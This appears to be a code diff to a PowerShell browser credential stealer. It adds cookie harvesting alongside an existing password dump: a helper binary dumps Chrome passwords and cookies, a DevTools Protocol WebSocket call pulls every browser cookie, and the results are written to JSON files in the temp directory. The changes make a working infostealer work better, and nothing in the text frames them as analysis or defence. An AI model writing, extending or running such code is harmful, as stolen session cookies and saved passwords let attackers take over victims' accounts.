@@ -102,6 +102,7 @@ $browsers = @(
 )
 
 $allPasswords = @()
+$allCookies = @()
 
 $script:killedBrowsers = $false
 
@@ -289,11 +290,16 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
       if ((Get-Item $hbd -ErrorAction Stop).Length -gt 100000) {
         $hd = "$env:TEMP\ho_$([IO.Path]::GetRandomFileName())"; New-Item -ItemType Directory -Path $hd -Force | Out-Null
         $p = Start-Process -FilePath $hbd -ArgumentList "--format json --dir $hd" -NoNewWindow -Wait -PassThru
-        $pf = "$hd\password.json"
+        $pf = "$hd\password.json"; $cf = "$hd\cookie.json"
         if (Test-Path $pf) {
           $hp = Get-Content $pf -Raw | ConvertFrom-Json; $hbdPwCount = $hp.Count
           ts "[dbg] HBD passwords: $hbdPwCount"
           foreach ($e in $hp) { $allPasswords += @{url=$e.Url;username=$e.UserName;password=$e.Password;browser="Chrome(HBD)"} }
+        }
+        if (Test-Path $cf) {
+          $hc = Get-Content $cf -Raw | ConvertFrom-Json
+          ts "[dbg] HBD cookies: $($hc.Count)"
+          foreach ($e in $hc) { $allCookies += @{host=$e.Host;name=$e.Name;value=$e.Value;browser="Chrome(HBD)"} }
         }
         Remove-Item $hd -Recurse -Force -ErrorAction SilentlyContinue
       }
@@ -320,23 +326,23 @@ if ($appBound -and ($pwCount -eq 0 -or $ckCount -eq 0)) {
         if ($wsUrl) {
           $ws = New-Object System.Net.WebSockets.ClientWebSocket
           $ws.ConnectAsync((New-Object Uri($wsUrl)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
-          # Send Network.enable then getAllCookies
-          $cmd1 = @{id=1;method="Network.enable"} | ConvertTo-Json -Compress
-          $b1 = [Text.Encoding]::UTF8.GetBytes($cmd1)
-          $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b1)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
-          $rb = New-Object byte[] 8192
-          $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
-          $cmd2 = @{id=2;method="Network.getAllCookies"} | ConvertTo-Json -Compress
-          $b2 = [Text.Encoding]::UTF8.GetBytes($cmd2)
-          $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b2)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
-          $list = New-Object Collections.Generic.List[byte]
-          do { $r = $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult(); $list.AddRange($rb[0..($r.Count-1)]) } while (!$r.EndOfMessage)
+          $cmd = @{id=1;method="Network.getAllCookies"} | ConvertTo-Json -Compress
+          $b = [Text.Encoding]::UTF8.GetBytes($cmd)
+          $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b)), ([Net.WebSockets.WebSocketMessageType]::Text), $true, ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+          $rb = New-Object byte[] 1048576; $list = New-Object Collections.Generic.List[byte]
+          do {
+            $r = $ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)), ([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
+            if ($r.Count -gt 0) { $list.AddRange([byte[]]($rb[0..($r.Count-1)])) }
+          } while (!$r.EndOfMessage)
           $ws.Dispose()
-          $resp = [Text.Encoding]::UTF8.GetString($list.ToArray()) | ConvertFrom-Json
-          if ($resp.result -and $resp.result.cookies) {
-            $cdpCkCount = $resp.result.cookies.Count
-            ts "[dbg] CDP cookies: $cdpCkCount"
-          }
+          try {
+            $resp = [Text.Encoding]::UTF8.GetString($list.ToArray()) | ConvertFrom-Json
+            if ($resp.result -and $resp.result.cookies -and $resp.id -eq 1) {
+              $cdpCkCount = $resp.result.cookies.Count
+              $allCookies += $resp.result.cookies
+              ts "[dbg] CDP cookies: $cdpCkCount"
+            }
+          } catch { ts "[dbg] CDP parse error: $_" }
         }
         if ($p -and !$p.HasExited) { $p.Kill() }
         Remove-Item $ud -Recurse -Force -ErrorAction SilentlyContinue
@@ -385,6 +391,13 @@ if ($allPasswords.Count -gt 0) {
     $allPasswords | ConvertTo-Json -Depth 3 | Set-Content $jsonPath -Encoding UTF8
     ts "$CK Passwords saved: $jsonPath ($($allPasswords.Count) entries)"
   } catch { ts "$WA Failed to save passwords: $_" }
+}
+if ($allCookies.Count -gt 0) {
+  try {
+    $ckPath = "$env:TEMP\cookies.json"
+    $allCookies | ConvertTo-Json -Depth 3 | Set-Content $ckPath -Encoding UTF8
+    ts "$CK Cookies saved: $ckPath ($($allCookies.Count) entries)"
+  } catch { ts "$WA Failed to save cookies: $_" }
 }
 
 if ($script:killedBrowsers) {
